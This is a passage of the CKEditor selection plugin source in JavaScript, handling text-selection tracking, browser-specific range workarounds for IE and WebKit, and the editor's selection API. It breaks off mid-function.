/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

(function()
{
	// #### checkSelectionChange : START

	// The selection change check basically saves the element parent tree of
	// the current node and check it on successive requests. If there is any
	// change on the tree, then the selectionChange event gets fired.
	function checkSelectionChange()
	{
		try
		{
			// In IE, the "selectionchange" event may still get thrown when
			// releasing the WYSIWYG mode, so we need to check it first.
			var sel = this.getSelection();
			if ( !sel || !sel.document.getWindow().$ )
				return;

			var firstElement = sel.getStartElement();
			var currentPath = new CKEDITOR.dom.elementPath( firstElement );

			if ( !currentPath.compare( this._.selectionPreviousPath ) )
			{
				this._.selectionPreviousPath = currentPath;
				this.fire( 'selectionChange', { selection : sel, path : currentPath, element : firstElement } );
			}
		}
		catch (e)
		{}
	}

	var checkSelectionChangeTimer,
		checkSelectionChangeTimeoutPending;

	function checkSelectionChangeTimeout()
	{
		// Firing the "OnSelectionChange" event on every key press started to
		// be too slow. This function guarantees that there will be at least
		// 200ms delay between selection checks.

		checkSelectionChangeTimeoutPending = true;

		if ( checkSelectionChangeTimer )
			return;

		checkSelectionChangeTimeoutExec.call( this );

		checkSelectionChangeTimer = CKEDITOR.tools.setTimeout( checkSelectionChangeTimeoutExec, 200, this );
	}

	function checkSelectionChangeTimeoutExec()
	{
		checkSelectionChangeTimer = null;

		if ( checkSelectionChangeTimeoutPending )
		{
			// Call this with a timeout so the browser properly moves the
			// selection after the mouseup. It happened that the selection was
			// being moved after the mouseup when clicking inside selected text
			// with Firefox.
			CKEDITOR.tools.setTimeout( checkSelectionChange, 0, this );

			checkSelectionChangeTimeoutPending = false;
		}
	}

	// #### checkSelectionChange : END

	function rangeRequiresFix( range )
	{
		function isTextCt( node, isAtEnd )
		{
			if ( !node || node.type == CKEDITOR.NODE_TEXT )
				return false;

			var testRng = range.clone();
			return testRng[ 'moveToElementEdit' + ( isAtEnd ? 'End' : 'Start' ) ]( node );
		}

		var ct = range.startContainer;

		var previous = range.getPreviousNode( isVisible, null, ct ),
			next = range.getNextNode( isVisible, null, ct );

		// Any adjacent text container may absorb the cursor, e.g.
		// <p><strong>text</strong>^foo</p>
		// <p>foo^<strong>text</strong></p>
		// <div>^<p>foo</p></div>
		if ( isTextCt( previous ) || isTextCt( next, 1 ) )
			return true;

		// Empty block/inline element is also affected. <span>^</span>, <p>^</p> (#7222)
		if ( !( previous || next ) && !( ct.type == CKEDITOR.NODE_ELEMENT && ct.isBlockBoundary() && ct.getBogus() ) )
			return true;

		return false;
	}

	var selectAllCmd =
	{
		modes : { wysiwyg : 1, source : 1 },
		readOnly : CKEDITOR.env.ie || CKEDITOR.env.webkit,
		exec : function( editor )
		{
			switch ( editor.mode )
			{
				case 'wysiwyg' :
					editor.document.$.execCommand( 'SelectAll', false, null );
					// Force triggering selectionChange (#7008)
					editor.forceNextSelectionCheck();
					editor.selectionChange();
					break;
				case 'source' :
					// Select the contents of the textarea
					var textarea = editor.textarea.$;
					if ( CKEDITOR.env.ie )
						textarea.createTextRange().execCommand( 'SelectAll' );
					else
					{
						textarea.selectionStart = 0;
						textarea.selectionEnd = textarea.value.length;
					}
					textarea.focus();
			}
		},
		canUndo : false
	};

	function createFillingChar( doc )
	{
		removeFillingChar( doc );

		var fillingChar = doc.createText( '\u200B' );
		doc.setCustomData( 'cke-fillingChar', fillingChar );

		return fillingChar;
	}

	function getFillingChar( doc )
	{
		return doc && doc.getCustomData( 'cke-fillingChar' );
	}

	// Checks if a filling char has been used, eventualy removing it (#1272).
	function checkFillingChar( doc )
	{
		var fillingChar = doc && getFillingChar( doc );
		if ( fillingChar )
		{
			// Use this flag to avoid removing the filling char right after
			// creating it.
			if ( fillingChar.getCustomData( 'ready' ) )
				removeFillingChar( doc );
			else
				fillingChar.setCustomData( 'ready', 1 );
		}
	}

	function removeFillingChar( doc )
	{
		var fillingChar = doc && doc.removeCustomData( 'cke-fillingChar' );
		if ( fillingChar )
		{
			var bm,
			sel = doc.getSelection().getNative(),
			// Be error proof.
			range = sel && sel.type != 'None' && sel.getRangeAt( 0 );

			// Text selection position might get mangled by
			// subsequent dom modification, save it now for restoring. (#8617)
			if ( fillingChar.getLength() > 1
				 && range && range.intersectsNode( fillingChar.$ ) )
			{
				bm = [ sel.anchorOffset, sel.focusOffset ];

				// Anticipate the offset change brought by the removed char.
				var startAffected = sel.anchorNode == fillingChar.$ && sel.anchorOffset > 0,
					endAffected = sel.focusNode == fillingChar.$ && sel.focusOffset > 0;
				startAffected && bm[ 0 ]--;
				endAffected && bm[ 1 ]--;

				// Revert the bookmark order on reverse selection.
				isReversedSelection( sel ) && bm.unshift( bm.pop() );
			}

			// We can't simply remove the filling node because the user
			// will actually enlarge it when typing, so we just remove the
			// invisible char from it.
			fillingChar.setText( fillingChar.getText().replace( /\u200B/g, '' ) );

			// Restore the bookmark.
			if ( bm )
			{
				var rng = sel.getRangeAt( 0 );
				rng.setStart( rng.startContainer, bm[ 0 ] );
				rng.setEnd( rng.startContainer, bm[ 1 ] );
				sel.removeAllRanges();
				sel.addRange( rng );
			}
		}
	}

	function isReversedSelection( sel )
	{
		if ( !sel.isCollapsed )
		{
			var range = sel.getRangeAt( 0 );
			// Potentially alter an reversed selection range.
			range.setStart( sel.anchorNode, sel.anchorOffset );
			range.setEnd( sel.focusNode, sel.focusOffset );
			return range.collapsed;
		}
	}

	CKEDITOR.plugins.add( 'selection',
	{
		init : function( editor )
		{
			// On WebKit only, we need a special "filling" char on some situations
			// (#1272). Here we set the events that should invalidate that char.
			if ( CKEDITOR.env.webkit )
			{
				editor.on( 'selectionChange', function() { checkFillingChar( editor.document ); } );
				editor.on( 'beforeSetMode', function() { removeFillingChar( editor.document ); } );

				var fillingCharBefore,
					resetSelection;

				function beforeData()
				{
					var doc = editor.document,
						fillingChar = getFillingChar( doc );

					if ( fillingChar )
					{
						// If cursor is right blinking by side of the filler node, save it for restoring,
						// as the following text substitution will blind it. (#7437)
						var sel = doc.$.defaultView.getSelection();
						if ( sel.type == 'Caret' && sel.anchorNode == fillingChar.$ )
							resetSelection = 1;

						fillingCharBefore = fillingChar.getText();
						fillingChar.setText( fillingCharBefore.replace( /\u200B/g, '' ) );
					}
				}
				function afterData()
				{
					var doc = editor.document,
						fillingChar = getFillingChar( doc );

					if ( fillingChar )
					{
						fillingChar.setText( fillingCharBefore );

						if ( resetSelection )
						{
							doc.$.defaultView.getSelection().setPosition( fillingChar.$,fillingChar.getLength() );
							resetSelection = 0;
						}
					}
				}
				editor.on( 'beforeUndoImage', beforeData );
				editor.on( 'afterUndoImage', afterData );
				editor.on( 'beforeGetData', beforeData, null, null, 0 );
				editor.on( 'getData', afterData );
			}

			editor.on( 'contentDom', function()
				{
					var doc = editor.document,
						outerDoc = CKEDITOR.document,
						body = doc.getBody(),
						html = doc.getDocumentElement();

					if ( CKEDITOR.env.ie )
					{
						// Other browsers don't loose the selection if the
						// editor document loose the focus. In IE, we don't
						// have support for it, so we reproduce it here, other
						// than firing the selection change event.

						var savedRange,
							saveEnabled,
							restoreEnabled = 1;

						// "onfocusin" is fired before "onfocus". It makes it
						// possible to restore the selection before click
						// events get executed.
						body.on( 'focusin', function( evt )
							{
								// If there are elements with layout they fire this event but
								// it must be ignored to allow edit its contents #4682
								if ( evt.data.$.srcElement.nodeName != 'BODY' )
									return;

								// Give the priority to locked selection since it probably
								// reflects the actual situation, besides locked selection
								// could be interfered because of text nodes normalizing.
								// (#6083, #6987)
								var lockedSelection = doc.getCustomData( 'cke_locked_selection' );
								if ( lockedSelection )
								{
									lockedSelection.unlock( 1 );
									lockedSelection.lock();
								}
								// Then check ff we have saved a range, restore it at this
								// point.
								else if ( savedRange && restoreEnabled )
								{
									// Well not break because of this.
									try { savedRange.select(); } catch (e) {}
									savedRange = null;
								}
							});

						body.on( 'focus', function()
							{
								// Enable selections to be saved.
								saveEnabled = 1;

								saveSelection();
							});

						body.on( 'beforedeactivate', function( evt )
							{
								// Ignore this event if it's caused by focus switch between
								// internal editable control type elements, e.g. layouted paragraph. (#4682)
								if ( evt.data.$.toElement )
									return;

								// Disable selections from being saved.
								saveEnabled = 0;
								restoreEnabled = 1;
							});

						// [IE] Iframe will still keep the selection when blurred, if
						// focus is moved onto a non-editing host, e.g. link or button, but
						// it becomes a problem for the object type selection, since the resizer
						// handler attached on it will mark other part of the UI, especially
						// for the dialog. (#8157)
						// [IE<8] Even worse For old IEs, the cursor will not vanish even if
						// the selection has been moved to another text input in some cases. (#4716)
						//
						// Now the range restore is disabled, so we simply force IE to clean
						// up the selection before blur.
						CKEDITOR.env.ie && editor.on( 'blur', function()
						{
							// Error proof when the editor is not visible. (#6375)
							try{ doc.$.selection.empty(); } catch ( er){}
						});

						// Listening on document element ensures that
						// scrollbar is included. (#5280)
						html.on( 'mousedown', function()
						{
							// Lock restore selection now, as we have
							// a followed 'click' event which introduce
							// new selection. (#5735)
							restoreEnabled = 0;
						});

						html.on( 'mouseup', function()
						{
							restoreEnabled = 1;
						});

						var scroll;
						// IE fires the "selectionchange" event when clicking
						// inside a selection. We don't want to capture that.
						body.on( 'mousedown', function( evt )
						{
							// IE scrolls document to top on right mousedown
							// when editor has no focus, remember this scroll
							// position and revert it before context menu opens. (#5778)
							if ( evt.data.$.button == 2 )
							{
								var sel = editor.document.$.selection;
								if ( sel.type == 'None' )
									scroll = editor.window.getScrollPosition();
							}
							disableSave();
						});

						body.on( 'mouseup',
							function( evt )
							{
								// Restore recorded scroll position when needed on right mouseup.
								if ( evt.data.$.button == 2 && scroll )
								{
									editor.document.$.documentElement.scrollLeft = scroll.x;
									editor.document.$.documentElement.scrollTop = scroll.y;
								}
								scroll = null;

								saveEnabled = 1;
								setTimeout( function()
									{
										saveSelection( true );
									},
									0 );
							});

						body.on( 'keydown', disableSave );
						body.on( 'keyup',
							function()
							{
								saveEnabled = 1;
								saveSelection();
							});

						// When content doc is in standards mode, IE doesn't produce text selection
						// when click on the region outside of body, we emulate
						// the correct behavior here. (#1659, #7932, # 9097)
						if ( doc.$.compatMode != 'BackCompat' )
						{
							if ( CKEDITOR.env.ie7Compat || CKEDITOR.env.ie6Compat )
							{
								function moveRangeToPoint( range, x, y )
								{
									// Error prune in IE7. (#9034, #9110)
									try { range.moveToPoint( x, y ); } catch ( e ) {}
								}

								html.on( 'mousedown', function( evt )
								{
									// Expand the text range along with mouse move.
									function onHover( evt )
									{
										evt = evt.data.$;
										if ( textRng )
										{
											// Read the current cursor.
											var rngEnd = body.$.createTextRange();

											moveRangeToPoint( rngEnd, evt.x, evt.y );

											// Handle drag directions.
											textRng.setEndPoint(
												startRng.compareEndPoints( 'StartToStart', rngEnd ) < 0 ?
												'EndToEnd' :
												'StartToStart',
												rngEnd );

											// Update selection with new range.
											textRng.select();
										}
									}

									function removeListeners()
									{
										outerDoc.removeListener( 'mouseup', onSelectEnd );
										html.removeListener( 'mouseup', onSelectEnd );
									}

									function onSelectEnd()
									{

										html.removeListener( 'mousemove', onHover );
										removeListeners();

										// Make it in effect on mouse up. (#9022)
										textRng.select();
									}

									evt = evt.data;

									// We're sure that the click happens at the region
									// outside body, but not on scrollbar.
									if ( evt.getTarget().is( 'html' ) &&
											 evt.$.x < html.$.clientWidth &&
											 evt.$.y < html.$.clientHeight )
									{
										// Start to build the text range.
										var textRng = body.$.createTextRange();
										moveRangeToPoint( textRng, evt.$.x, evt.$.y );
										// Records the dragging start of the above text range.
										var startRng = textRng.duplicate();

										html.on( 'mousemove', onHover );
										outerDoc.on( 'mouseup', onSelectEnd );
										html.on( 'mouseup', onSelectEnd );
									}
								});
							}

							// It's much simpler for IE > 8, we just need to reselect the reported range.
							if ( CKEDITOR.env.ie8 )
							{
								html.on( 'mousedown', function( evt )
								{
									if ( evt.data.getTarget().is( 'html' ) )
									{
										// Limit the text selection mouse move inside of editable. (#9715)
										outerDoc.on( 'mouseup', onSelectEnd );
										html.on( 'mouseup', onSelectEnd );
									}

								});

								function removeListeners()
								{
									outerDoc.removeListener( 'mouseup', onSelectEnd );
									html.removeListener( 'mouseup', onSelectEnd );
								}

								function onSelectEnd()
								{
									removeListeners();

									// The event is not fired when clicking on the scrollbars,
									// so we can safely check the following to understand
									// whether the empty space following <body> has been clicked.
										var sel = CKEDITOR.document.$.selection,
											range = sel.createRange();
										// The selection range is reported on host, but actually it should applies to the content doc.
										if ( sel.type != 'None' && range.parentElement().ownerDocument == doc.$ )
											range.select();
								}
							}

						}
						// IE is the only to provide the "selectionchange"
						// event.
						doc.on( 'selectionchange', saveSelection );

						function disableSave()
						{
							saveEnabled = 0;
						}

						function saveSelection( testIt )
						{
							if ( saveEnabled )
							{
								var doc = editor.document,
									sel = editor.getSelection(),
									nativeSel = sel && sel.getNative();

								// There is a very specific case, when clicking
								// inside a text selection. In that case, the
								// selection collapses at the clicking point,
								// but the selection object remains in an
								// unknown state, making createRange return a
								// range at the very start of the document. In
								// such situation we have to test the range, to
								// be sure it's valid.
								if ( testIt && nativeSel && nativeSel.type == 'None' )
								{
									// The "InsertImage" command can be used to
									// test whether the selection is good or not.
									// If not, it's enough to give some time to
									// IE to put things in order for us.
									if ( !doc.$.queryCommandEnabled( 'InsertImage' ) )
									{
										CKEDITOR.tools.setTimeout( saveSelection, 50, this, true );
										return;
									}
								}

								// Avoid saving selection from within text input. (#5747)
								var parentTag;
								if ( nativeSel && nativeSel.type && nativeSel.type != 'Control'
									&& ( parentTag = nativeSel.createRange() )
									&& ( parentTag = parentTag.parentElement() )
									&& ( parentTag = parentTag.nodeName )
									&& parentTag.toLowerCase() in { input: 1, textarea : 1 } )
								{
									return;
								}

								// Not break because of this. (#9132)
								try{ savedRange = nativeSel && sel.getRanges()[ 0 ]; } catch( er ) {}

								checkSelectionChangeTimeout.call( editor );
							}
						}
					}
					else
					{
						// In other browsers, we make the selection change
						// check based on other events, like clicks or keys
						// press.

						doc.on( 'mouseup', checkSelectionChangeTimeout, editor );
						doc.on( 'keyup', checkSelectionChangeTimeout, editor );
						doc.on( 'selectionchange', checkSelectionChangeTimeout, editor );
					}

					if ( CKEDITOR.env.webkit )
					{
						// Before keystroke is handled by editor, check to remove the filling char.
						doc.on( 'keydown', function( evt )
						{
							var key = evt.data.getKey();
							// Remove the filling char before some keys get
							// executed, so they'll not get blocked by it.
							switch ( key )
							{
								case 13 :	// ENTER
								case 33 :	// PAGEUP
								case 34 :	// PAGEDOWN
								case 35 :	// HOME
								case 36 :	// END
								case 37 :	// LEFT-ARROW
								case 39 :	// RIGHT-ARROW
								case 8 :	// BACKSPACE
								case 45 :	// INS
								case 46 :	// DEl
									removeFillingChar( editor.document );
							}

						}, null, null, -1 );
					}
				});

			// Clear the cached range path before unload. (#7174)
			editor.on( 'contentDomUnload', editor.forceNextSelectionCheck, editor );

			editor.addCommand( 'selectAll', selectAllCmd );
			editor.ui.addButton( 'SelectAll',
				{
					label : editor.lang.selectAll,
					command : 'selectAll'
				});

			/**
			 * Check if to fire the {@link CKEDITOR.editor#selectionChange} event
			 * for the current editor instance.
			 *
			 * @param {Boolean} checkNow Check immediately without any delay.
			 */
			editor.selectionChange = function( checkNow )
			{
				( checkNow ? checkSelectionChange : checkSelectionChangeTimeout ).call( this );
			};

			// IE9 might cease to work if there's an object selection inside the iframe (#7639).
			CKEDITOR.env.ie9Compat && editor.on( 'destroy', function()
			{
				var sel = editor.getSelection();
				sel && sel.getNative().clear();
			}, null, null, 9 );
		}
	});

	/**
	 * Gets the current selection from the editing area when in WYSIWYG mode.
	 * @returns {CKEDITOR.dom.selection} A selection object or null if not in
	 *		WYSIWYG mode or no selection is available.
	 * @example
	 * var selection = CKEDITOR.instances.editor1.<strong>getSelection()</strong>;
	 * alert( selection.getType() );
	 */
	CKEDITOR.editor.prototype.getSelection = function()
	{
		return this.document && this.document.getSelection();
	};

	CKEDITOR.editor.prototype.forceNextSelectionCheck = function()
	{
		delete this._.selectionPreviousPath;
	};

	/**
	 * Gets the current selection from the document.
	 * @returns {CKEDITOR.dom.selection} A selection object.
	 * @example
	 * var selection = CKEDITOR.instances.editor1.document.<strong>getSelection()</strong>;
	 * alert( selection.getType() );
	 */
	CKEDITOR.dom.document.prototype.getSelection = function()
	{
		var sel = new CKEDITOR.dom.selection( this );
		return ( !sel || sel.isInvalid ) ? null : sel;
	};

	/**
	 * No selection.
	 * @constant
	 * @example
	 * if ( editor.getSelection().getType() == CKEDITOR.SELECTION_NONE )
	 *     alert( 'Nothing is selected' );
	 */
	CKEDITOR.SELECTION_NONE		= 1;

	/**
	 * A text or a collapsed selection.
	 * @constant
	 * @example
	 * if ( editor.getSelection().getType() == CKEDITOR.SELECTION_TEXT )
	 *     alert( 'A text is selected' );
	 */
	CKEDITOR.SELECTION_TEXT		= 2;

	/**
	 * Element selection.
	 * @constant
	 * @example
	 * if ( editor.getSelection().getType() == CKEDITOR.SELECTION_ELEMENT )
	 *     alert( 'An element is selected' );
	 */
	CKEDITOR.SELECTION_ELEMENT	= 3;

	/**
	 * Manipulates the selection in a DOM document.
	 * @constructor
	 * @param {CKEDITOR.dom.document} document The DOM document that contains the selection.
	 * @example
	 * var sel = new <strong>CKEDITOR.dom.selection( CKEDITOR.document )</strong>;
	 */
	CKEDITOR.dom.selection = function( document )
	{
		var lockedSelection = document.getCustomData( 'cke_locked_selection' );

		if ( lockedSelection )
			return lockedSelection;

		this.document = document;
		this.isLocked = 0;
		this._ =
		{
			cache : {}
		};

		/**
		 * IE BUG: The selection's document may be a different document than the
		 * editor document. Return null if that is the case.
		 */
		if ( CKEDITOR.env.ie )
		{
			// Avoid breaking because of it. (#8836)
			try
			{
				var range = this.getNative().createRange();
				if ( !range ||
					 ( range.item && range.item( 0 ).ownerDocument != this.document.$ ) ||
					 ( range.parentElement && range.parentElement().ownerDocument != this.document.$ ) )
				{
					throw 0;
				}
			}
			catch ( e )
			{
				this.isInvalid = true;
			}
		}

		return this;
	};

	var styleObjectElements =
		{
			img:1,hr:1,li:1,table:1,tr:1,td:1,th:1,embed:1,object:1,ol:1,ul:1,
			a:1,input:1,form:1,select:1,textarea:1,button:1,fieldset:1,thead:1,tfoot:1
		};

	CKEDITOR.dom.selection.prototype =
	{
		/**
		 * Gets the native selection object from the browser.
		 * @function
		 * @returns {Object} The native browser selection object.
		 * @example
		 * var selection = editor.getSelection().<strong>getNative()</strong>;
		 */
		getNative :
			CKEDITOR.env.ie ?
				function()
				{
					return this._.cache.nativeSel || ( this._.cache.nativeSel = this.document.$.selection );
				}
			:
				function()
				{
					return this._.cache.nativeSel || ( this._.cache.nativeSel = this.document.getWindow().$.getSelection() );
				},

		/**
		 * Gets the type of the current selection. The following values are
		 * available:
		 * <ul>
		 *		<li><code>{@link CKEDITOR.SELECTION_NONE}</code> (1): No selection.</li>
		 *		<li><code>{@link CKEDITOR.SELECTION_TEXT}</code> (2): A text or a collapsed
		 *			selection is selected.</li>
		 *		<li><code>{@link CKEDITOR.SELECTION_ELEMENT}</code> (3): An element is
		 *			selected.</li>
		 * </ul>
		 * @function
		 * @returns {Number} One of the following constant values:
		 *		<code>{@link CKEDITOR.SELECTION_NONE}</code>, <code>{@link CKEDITOR.SELECTION_TEXT}</code>, or
		 *		<code>{@link CKEDITOR.SELECTION_ELEMENT}</code>.
		 * @example
		 * if ( editor.getSelection().<strong>getType()</strong> == CKEDITOR.SELECTION_TEXT )
		 *     alert( 'A text is selected' );
		 */
		getType :
			CKEDITOR.env.ie ?
				function()
				{
					var cache = this._.cache;
					if ( cache.type )
						return cache.type;

					var type = CKEDITOR.SELECTION_NONE;

					try
					{
						var sel = this.getNative(),
							ieType = sel.type;

						if ( ieType == 'Text' )
							type = CKEDITOR.SELECTION_TEXT;

						if ( ieType == 'Control' )
							type = CKEDITOR.SELECTION_ELEMENT;

						// It is possible that we can still get a text range
						// object even when type == 'None' is returned by IE.
						// So we'd better check the object returned by
						// createRange() rather than by looking at the type.
						if ( sel.createRange().parentElement )
							type = CKEDITOR.SELECTION_TEXT;
					}
					catch(e) {}

					return ( cache.type = type );
				}
			:
				function()
				{
					var cache = this._.cache;
					if ( cache.type )
						return cache.type;

					var type = CKEDITOR.SELECTION_TEXT;

					var sel = this.getNative();

					if ( !sel )
						type = CKEDITOR.SELECTION_NONE;
					else if ( sel.rangeCount == 1 )
					{
						// Check if the actual selection is a control (IMG,
						// TABLE, HR, etc...).

						var range = sel.getRangeAt(0),
							startContainer = range.startContainer;

						if ( startContainer == range.endContainer
							&& startContainer.nodeType == 1
							&& ( range.endOffset - range.startOffset ) == 1
							&& styleObjectElements[ startContainer.childNodes[ range.startOffset ].nodeName.toLowerCase() ] )
						{
							type = CKEDITOR.SELECTION_ELEMENT;
						}
					}

					return ( cache.type = type );
				},

		/**
		 * Retrieves the <code>{@link CKEDITOR.dom.range}</code> instances that represent the current selection.
		 * Note: Some browsers return multiple ranges even for a continuous selection. Firefox, for example, returns
		 * one range for each table cell when one or more table rows are selected.
		 * @function
		 * @param {Boolean} [onlyEditables] If set to <code>true</code>, this function retrives editable ranges only.
		 * @return {Array} Range instances that represent the current selection.
		 * @example
		 * var ranges = selection.<strong>getRanges()</strong>;
		 * alert( ranges.length );
		 */
		getRanges : (function()
		{
			var func = CKEDITOR.env.ie ?
				( function()
				{
					function getNodeIndex( node ) { return new CKEDITOR.dom.node( node ).getIndex(); }

					// Finds the container and offset for a specific boundary
					// of an IE range.
					var getBoundaryInformation = function( range, start )
					{
						// Creates a collapsed range at the requested boundary.
						range = range.duplicate();
						range.collapse( start );

						// Gets the element that encloses the range entirely.
						var parent = range.parentElement(),
							doc = parent.ownerDocument;

						// Empty parent element, e.g. <i>^</i>
						if ( !parent.hasChildNodes() )
							return  { container : parent, offset : 0 };

						var siblings = parent.children,
							child,
							sibling,
							testRange = range.duplicate(),
							startIndex = 0,
							endIndex = siblings.length - 1,
							index = -1,
							position,
							distance,
							container;

						// Binary search over all element childs to test the range to see whether
						// range is right on the boundary of one element.
						while ( startIndex <= endIndex )
						{
							index = Math.floor( ( startIndex + endIndex ) / 2 );
							child = siblings[ index ];
							testRange.moveToElementText( child );
							position = testRange.compareEndPoints( 'StartToStart', range );

							if ( position > 0 )
								endIndex = index - 1;
							else if ( position < 0 )
								startIndex = index + 1;
							else
							{
								// IE9 report wrong measurement with compareEndPoints when range anchors between two BRs.
								// e.g. <p>text<br />^<br /></p> (#7433)
								if ( CKEDITOR.env.ie9Compat && child.tagName == 'BR' )
								{
									// "Fall back" to w3c selection.
									var sel = doc.defaultView.getSelection();
									return { container : sel[ start ? 'anchorNode' : 'focusNode' ],
										offset : sel[ start ? 'anchorOffset' : 'focusOffset' ] };
								}
								else
									return { container : parent, offset : getNodeIndex( child ) };
							}
						}

						// All childs are text nodes,
						// or to the right hand of test range are all text nodes. (#6992)
						if ( index == -1 || index == siblings.length - 1 && position < 0 )
						{
							// Adapt test range to embrace the entire parent contents.
							testRange.moveToElementText( parent );
							testRange.setEndPoint( 'StartToStart', range );

							// IE report line break as CRLF with range.text but
							// only LF with textnode.nodeValue, normalize them to avoid
							// breaking character counting logic below. (#3949)
							distance = testRange.text.replace( /(\r\n|\r)/g, '\n' ).length;

							siblings = parent.childNodes;

							// Actual range anchor right beside test range at the boundary of text node.
							if ( !distance )
							{
								child = siblings[ siblings.length - 1 ];

								if ( child.nodeType != CKEDITOR.NODE_TEXT )
									return { container : parent, offset : siblings.length };
								else
									return { container : child, offset : child.nodeValue.length };
							}

							// Start the measuring until distance overflows, meanwhile count the text nodes.
							var i = siblings.length;
							while ( distance > 0 && i > 0 )
							{
								sibling = siblings[ --i ];
								if ( sibling.nodeType == CKEDITOR.NODE_TEXT )
								{
									container = sibling;
									distance -= sibling.nodeValue.length;
								}
							}

							return  { container : container, offset : -distance };
						}
						// Test range was one offset beyond OR behind the anchored text node.
						else
						{
							// Adapt one side of test range to the actual range
							// for measuring the offset between them.
							testRange.collapse( position > 0 ? true : false );
							testRange.setEndPoint( position > 0 ? 'StartToStart' : 'EndToStart', range );

							// IE report line break as CRLF with range.text but
							// only LF with textnode.nodeValue, normalize them to avoid
							// breaking character counting logic below. (#3949)
							distance = testRange.text.replace( /(\r\n|\r)/g, '\n' ).length;

							// Actual range anchor right beside test range at the inner boundary of text node.
							if ( !distance )
								return { container : parent, offset : getNodeIndex( child ) + ( position > 0 ? 0 : 1 ) };

							// Start the measuring until distance overflows, meanwhile count the text nodes.
							while ( distance > 0 )
							{
								try
								{
									sibling = child[ position > 0 ? 'previousSibling' : 'nextSibling' ];
									if ( sibling.nodeType == CKEDITOR.NODE_TEXT )
									{
										distance -= sibling.nodeValue.length;
										container = sibling;
									}
									child = sibling;
								}
								// Measurement in IE could be somtimes wrong because of <select> element. (#4611)
								catch( e )
								{
									return { container : parent, offset : getNodeIndex( child ) };
								}
							}

							return { container : container, offset : position > 0 ? -distance : container.nodeValue.length + distance };
						}
					};

					return function()
					{
						// IE doesn't have range support (in the W3C way), so we
						// need to do some magic to transform selections into
						// CKEDITOR.dom.range instances.

						var sel = this.getNative(),
							nativeRange = sel && sel.createRange(),
							type = this.getType(),
							range;

						if ( !sel )
							return [];

						if ( type == CKEDITOR.SELECTION_TEXT )
						{
							range = new CKEDITOR.dom.range( this.document );

							var boundaryInfo = getBoundaryInformation( nativeRange, true );
							range.setStart( new CKEDITOR.dom.node( boundaryInfo.container ), boundaryInfo.offset );

							boundaryInfo = getBoundaryInformation( nativeRange );
							range.setEnd( new CKEDITOR.dom.node( boundaryInfo.container ), boundaryInfo.offset );

							// Correct an invalid IE range case on empty list item. (#5850)
							if ( range.endContainer.getPosition( range.startContainer ) & CKEDITOR.POSITION_PRECEDING
									&& range.endOffset <= range.startContainer.getIndex() )
							{
								range.collapse();
							}

							return [ range ];
						}
						else if ( type == CKEDITOR.SELECTION_ELEMENT )
						{
							var retval = [];

							for ( var i = 0 ; i < nativeRange.length ; i++ )
							{
								var element = nativeRange.item( i ),
									parentElement = element.parentNode,
									j = 0;

								range = new CKEDITOR.dom.range( this.document );

								for (; j < parentElement.childNodes.length && parentElement.childNodes[j] != element ; j++ )
								{ /*jsl:pass*/ }

								range.setStart( new CKEDITOR.dom.node( parentElement ), j );
								range.setEnd( new CKEDITOR.dom.node( parentElement ), j + 1 );
								retval.push( range );
							}

							return retval;
						}

						return [];
					};
				})()
			:
				function()
				{

					// On browsers implementing the W3C range, we simply
					// tranform the native ranges in CKEDITOR.dom.range
					// instances.

					var ranges = [],
						range,
						doc = this.document,
						sel = this.getNative();

					if ( !sel )
						return ranges;

					// On WebKit, it may happen that we'll have no selection
					// available. We normalize it here by replicating the
					// behavior of other browsers.
					if ( !sel.rangeCount )
					{
						range = new CKEDITOR.dom.range( doc );
						range.moveToElementEditStart( doc.getBody() );
						ranges.push( range );
					}

					for ( var i = 0 ; i < sel.rangeCount ; i++ )
					{
						var nativeRange = sel.getRangeAt( i );

						range = new CKEDITOR.dom.range( doc );

						range.setStart( new CKEDITOR.dom.node( nativeRange.startContainer ), nativeRange.startOffset );
						range.setEnd( new CKEDITOR.dom.node( nativeRange.endContainer ), nativeRange.endOffset );
						ranges.push( range );
					}
					return ranges;
				};

			return function( onlyEditables )
			{
				var cache = this._.cache;
				if ( cache.ranges && !onlyEditables )
					return cache.ranges;
				else if ( !cache.ranges )
					cache.ranges = new CKEDITOR.dom.rangeList( func.call( this ) );

				// Split range into multiple by read-only nodes.
				if ( onlyEditables )
				{
					var ranges = cache.ranges;
					for ( var i = 0; i < ranges.length; i++ )
					{
						var range = ranges[ i ];

						// Drop range spans inside one ready-only node.
						var parent = range.getCommonAncestor();
						if ( parent.isReadOnly() )
							ranges.splice( i, 1 );

						if ( range.collapsed )
							continue;

						// Range may start inside a non-editable element,
						// replace the range start after it.
						if ( range.startContainer.isReadOnly() )
						{
							var current = range.startContainer;
							while( current )
							{
								if ( current.is( 'body' ) || !current.isReadOnly() )
									break;

								if ( current.type == CKEDITOR.NODE_ELEMENT
										&& current.getAttribute( 'contentEditable' ) == 'false' )
									range.setStartAfter( current );

								current = current.getParent();
							}
						}

						var startContainer = range.startContainer,
							endContainer = range.endContainer,
							startOffset = range.startOffset,
							endOffset = range.endOffset,
							walkerRange = range.clone();

						// Enlarge range start/end with text node to avoid walker
						// being DOM destructive, it doesn't interfere our checking
						// of elements below as well.
						if ( startContainer && startContainer.type == CKEDITOR.NODE_TEXT )
						{
							if ( startOffset >= startContainer.getLength() )
								walkerRange.setStartAfter( startContainer );
							else
								walkerRange.setStartBefore( startContainer );
						}

						if ( endContainer && endContainer.type == CKEDITOR.NODE_TEXT )
						{
							if ( !endOffset )
								walkerRange.setEndBefore( endContainer );
							else
								walkerRange.setEndAfter( endContainer );
						}

						// Looking for non-editable element inside the range.
						var walker = new CKEDITOR.dom.walker( walkerRange );
						walker.evaluator = function( node )
						{
							if ( node.type == CKEDITOR.NODE_ELEMENT
								&& node.isReadOnly() )
							{
								var newRange = range.clone();
								range.setEndBefore( node );

								// Drop collapsed range around read-only elements,
								// it make sure the range list empty when selecting
								// only non-editable elements.
								if ( range.collapsed )
									ranges.splice( i--, 1 );

								// Avoid creating invalid range.
								if ( !( node.getPosition( walkerRange.endContainer ) & CKEDITOR.POSITION_CONTAINS ) )
								{
									newRange.setStartAfter( node );
									if ( !newRange.collapsed )
										ranges.splice( i + 1, 0, newRange );
								}

								return true;
							}

							return false;
						};

						walker.next();
					}
				}

				return cache.ranges;
			};
		})(),

		/**
		 * Gets the DOM element in which the selection starts.
		 * @returns {CKEDITOR.dom.element} The element at the beginning of the
		 *		selection.
		 * @example
		 * var element = editor.getSelection().<strong>getStartElement()</strong>;
		 * alert( element.getName() );
		 */
		getStartElement : function()
		{
			var cache = this._.cache;
			if ( cache.startElement !== undefined )
